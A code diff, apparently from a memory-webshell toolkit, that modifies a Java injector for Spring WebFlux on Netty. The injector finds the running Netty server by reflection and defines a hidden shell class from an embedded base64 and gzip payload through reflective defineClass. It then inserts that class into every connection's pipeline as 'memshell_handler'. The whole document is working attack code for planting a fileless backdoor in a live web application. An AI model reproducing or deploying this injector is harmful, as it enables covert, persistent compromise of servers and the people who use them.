@@ -35,18 +35,14 @@ public class SpringWebFluxNettyHandlerInjector implements ChannelPipelineConfigu
     public SpringWebFluxNettyHandlerInjector() {
         try {
             Object nettyServer = getNettyServer();
-            Object handler = getShell();
-            inject(nettyServer, handler);
+            handlerClass = getShellClass();
+            inject(nettyServer);
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    private Object handler;
-
-    public SpringWebFluxNettyHandlerInjector(Object handler) {
-        this.handler = handler;
-    }
+    private Class<?> handlerClass;
 
     public Object getNettyServer() throws Exception {
         ThreadGroup group = Thread.currentThread().getThreadGroup();
@@ -61,29 +57,22 @@ public class SpringWebFluxNettyHandlerInjector implements ChannelPipelineConfigu
         return null;
     }
 
-    private Object getShell() throws Exception {
+    private Class<?> getShellClass() throws Exception {
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        Object interceptor = null;
         try {
-            interceptor = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName());
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            interceptor = clazz.newInstance();
+            return (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-        return interceptor;
     }
 
-    public void inject(Object nettyServer, Object handler) {
-        try {
-            Object config = getFieldValue(getFieldValue(nettyServer, "val$disposableServer"), "config");
-            this.handler = handler;
-            setFieldValue(config, "doOnChannelInit", this);
-            System.out.println("netty handler injected successfully");
-        } catch (Exception ignored) {
-        }
+    public void inject(Object nettyServer) throws Exception {
+        Object config = getFieldValue(getFieldValue(nettyServer, "val$disposableServer"), "config");
+        setFieldValue(config, "doOnChannelInit", this);
+        System.out.println("netty handler injected successfully");
     }
 
     @SuppressWarnings("all")
@@ -149,6 +138,10 @@ public class SpringWebFluxNettyHandlerInjector implements ChannelPipelineConfigu
     @Override
     public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress remoteAddress) {
         ChannelPipeline pipeline = channel.pipeline();
-        pipeline.addBefore("reactor.left.httpTrafficHandler", "memshell_handler", ((ChannelHandler) handler));
+        try {
+            pipeline.addBefore("reactor.left.httpTrafficHandler", "memshell_handler", ((ChannelHandler) handlerClass.newInstance()));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 }
